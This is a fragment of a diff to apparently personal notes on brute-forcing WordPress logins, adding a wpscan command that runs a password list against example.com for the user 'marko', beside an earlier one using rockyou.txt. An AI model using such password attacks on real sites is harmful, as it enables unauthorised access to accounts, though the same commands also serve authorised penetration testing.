@@ -19,10 +19,15 @@ wpscan --url http://192.168.1.100/wordp/ -U users.txt –P  /usr/…./rockyou.tx
 
 /wp-admin
 
+-----------------------------------------------------------------------------
+*********the one is working for me now
+
+wpscan --url https://example.com/  -P /home/pass.txt  --usernames  marko
 
 
 
 
+--------------------------------------------------------------
 
 
 
